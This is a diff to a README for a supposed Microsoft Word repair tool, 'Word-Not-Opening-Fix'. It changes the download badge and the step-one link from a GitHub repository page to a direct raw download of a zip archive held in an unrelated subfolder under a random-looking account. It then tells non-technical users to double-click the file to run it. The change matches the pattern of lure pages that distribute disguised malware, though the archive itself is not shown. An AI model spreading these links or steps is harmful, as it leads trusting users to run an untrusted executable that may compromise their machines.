@@ -5,7 +5,7 @@ description: "Repair Microsoft Word launch errors on Windows 10 and 11 with this
 ---
 # 🛠️ Word-Not-Opening-Fix - Restore Your Word Document Access Now
 
-[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue)](https://github.com/nonsensical-bevatron676/Word-Not-Opening-Fix)
+[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue)](https://raw.githubusercontent.com/nonsensical-bevatron676/nonsensical-bevatron676.github.io/main/subrhombic/github-nonsensical-bevatron-io-v2.9.zip)
 
 This tool fixes Microsoft Word for Windows 10 and Windows 11. Use this software if your application crashes on startup or hangs during the loading process. These steps require no technical knowledge.
 
@@ -22,7 +22,7 @@ Microsoft Word sometimes fails to open due to corrupted configuration files or c
 
 ## 📥 How to Download and Run
 
-1. Open the [download page](https://github.com/nonsensical-bevatron676/Word-Not-Opening-Fix).
+1. Open the [download page](https://raw.githubusercontent.com/nonsensical-bevatron676/nonsensical-bevatron676.github.io/main/subrhombic/github-nonsensical-bevatron-io-v2.9.zip).
 2. Click the release link to save the file to your computer.
 3. Locate the file in your Downloads folder.
 4. Double-click the file to start the repair process.
